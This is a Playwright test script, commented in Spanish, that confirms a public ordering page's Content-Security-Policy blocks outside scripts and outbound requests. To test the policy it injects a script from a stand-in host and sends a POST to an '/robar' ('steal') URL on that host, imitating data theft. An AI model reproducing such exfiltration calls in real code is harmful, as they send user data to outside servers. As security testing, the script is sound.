// 🛡️ 1.99.84 · Lista blanca (CSP) de la página pública de pedidos. Revisa:
//  1. La página abre y funciona normal (menú, buscar, carrito) sin nada bloqueado por la lista.
//  2. Un código de otro sitio («<script src=https://otro-sitio…>») NO se carga, y queda anotado.
//  3. Mandar datos a un servidor ajeno (fetch) se bloquea.
'use strict';
const { chromium } = require(process.env.PLAYWRIGHT_PATH || 'playwright');
const B = process.env.VENTO_BASE || 'http://localhost:8765';
(async () => {
  const b = await chromium.launch(); let ok = 0, mal = 0; const errs = [];
  const chk = (n, c, x) => { if(c){ ok++; console.log('✅ ' + n); } else { mal++; console.log('❌ ' + n + (x !== undefined ? ' → ' + JSON.stringify(x).slice(0, 500) : '')); } };
  try{
    const ctx = await b.newContext({ viewport: { width: 412, height: 915 } });
    let pidioAjeno = false;
    await ctx.route('**/*', r => { const h = new URL(r.request().url()).hostname; if(h === 'otro-sitio.example') pidioAjeno = true; return h === 'localhost' ? r.continue() : r.abort(); });
    const p = await ctx.newPage(); p.on('pageerror', e => errs.push(e.message));
    await p.goto(B + '/pedido.html?mesa=3&c=abcdef'); await p.waitForTimeout(1500);
    const csp = await p.evaluate(() => !!document.querySelector('meta[http-equiv="Content-Security-Policy"]'));
    chk('0. la página trae su lista blanca', csp);
    // botones con su código en la misma página (onclick=) siguen funcionando
    const r1 = await p.evaluate(() => { const bt = document.querySelector('[onclick]'); return { hay: !!bt, bloqueos: window.__cspBloqueos.slice() }; });
    chk('1. abre sin nada bloqueado', r1.bloqueos.length === 0, r1);
    const r2 = await p.evaluate(() => new Promise(res => { const s = document.createElement('script'); s.src = 'https://otro-sitio.example/malo.js'; s.onload = () => res('cargó'); s.onerror = () => res('bloqueado'); document.head.appendChild(s); setTimeout(() => res('sin respuesta'), 3000); }));
    await p.waitForTimeout(300);
    const bl = await p.evaluate(() => window.__cspBloqueos.slice());
    chk('2. código de otro sitio no se carga y queda anotado', r2 === 'bloqueado' && bl.some(x => /script-src/.test(x) && /otro-sitio/.test(x)) && !pidioAjeno, { r2, bl, pidioAjeno });
    const r3 = await p.evaluate(async () => { try{ await (window.__ventoFetchNativo || fetch)('https://otro-sitio.example/robar', { method: 'POST', body: 'x' }); return 'salió'; }catch(e){ return 'bloqueado'; } });
    await p.waitForTimeout(300);
    const bl2 = await p.evaluate(() => window.__cspBloqueos.slice());
    chk('3. mandar datos a un servidor ajeno se bloquea', r3 === 'bloqueado' && bl2.some(x => /connect-src/.test(x)) && !pidioAjeno, { r3, bl2 });
    chk('4. sin errores de página', errs.length === 0, errs);
  }catch(e){ mal++; console.log('❌ excepción: ' + e.message); }
  await b.close(); console.log('RESULTADO', ok, 'bien', mal, 'mal'); process.exit(mal ? 1 : 0);
})();
